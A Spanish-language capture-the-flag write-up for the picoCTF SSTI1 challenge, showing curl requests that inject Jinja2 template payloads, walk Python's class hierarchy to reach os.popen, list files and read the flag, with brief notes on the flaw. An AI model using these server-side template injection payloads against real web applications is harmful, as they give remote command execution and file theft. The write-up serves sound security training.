**RETO:**  
SSTI1

**DESCRIPCIÓN:**  
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!  
[http://rescued-float.picoctf.net:50350/](http://rescued-float.picoctf.net:50350/)

**SOLUCIÓN:**

1. **Análisis inicial del sitio web**:
    
    - Accedí al sitio web que presentaba un formulario simple para "anunciar" contenido
        
    - El formulario enviaba datos mediante POST al parámetro `content`
        
    - El servidor redirigía a `/announce` después del procesamiento
        
2. **Identificación de la vulnerabilidad SSTI**:
    
    - Probé payloads básicos de Server-Side Template Injection:
        
        bash
        
        curl -X POST http://rescued-float.picoctf.net:50350/ -d "content={{7*7}}" -L
        
    - La respuesta fue `49`, confirmando vulnerabilidad SSTI en Jinja2
        
    - También probé `{{'7'*7}}` que devolvió `7777777`
        
3. **Enumeración del entorno**:
    
    - Listé las clases disponibles en Python:
        
        bash
        
        curl -X POST http://rescued-float.picoctf.net:50350/ -d "content={{''.__class__.__mro__[1].__subclasses__()}}" -L
        
    - Identifiqué múltiples clases del sistema, incluyendo `os` y `subprocess`
        
4. **Explotación para ejecución de comandos**:
    
    - Accedí al módulo `os` a través de una clase disponible:
        
        bash
        
        curl -X POST http://rescued-float.picoctf.net:50350/ -d "content={{''.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}" -L
        
    - Esto reveló los archivos del directorio: `__pycache__`, `app.py`, `flag`, `requirements.txt`
        
5. **Obtención de la flag**:
    
    - Leí el archivo `flag` usando el mismo método:
        
        bash
        
        curl -X POST http://rescued-float.picoctf.net:50350/ -d "content={{''.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__['sys'].modules['os'].popen('cat flag').read()}}" -L
        

**FLAG OBTENIDA:**  
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}`

**NOTAS ADICIONALES:**

- La flag `s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001` describe exactamente la vulnerabilidad explotada
    
- Este reto demuestra los peligros de renderizar entrada de usuario sin sanitización en motores de plantillas
    
- Jinja2 es comúnmente usado en aplicaciones Flask y es vulnerable a SSTI cuando no se configuran correctamente
    
- La explotación permitió escalar desde inyección de templates hasta ejecución remota de comandos
    
- El método utilizado accedió a la cadena de herencia de clases de Python para llegar al módulo `os` del sistema